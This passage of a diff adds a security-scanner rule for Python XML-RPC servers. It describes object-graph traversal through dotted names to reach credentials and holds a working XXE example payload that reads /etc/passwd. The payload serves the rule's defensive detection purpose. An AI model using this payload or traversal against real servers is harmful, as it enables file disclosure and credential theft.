+        registered instance. An attacker sends an XML-RPC request calling
+        '__class__.__init__.__globals__' to traverse the object graph and
+        access sensitive module-level variables including database
+        credentials. Additionally, the attacker includes an XXE payload
+        in the XML request to read /etc/passwd through file:// entity
+        loading.
+      example_payload: "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><methodCall><methodName>system.listMethods</methodName><params><param><value>&xxe;</value></param></params></methodCall>"
+      attacker_objective: "Exploit XML-RPC server to achieve SSRF, XXE file disclosure, or object traversal through dotted name access"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "contextual"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "DESER-PY-001"
+        - "DESER-PY-002"
+        - "DESER-JAVA-002"
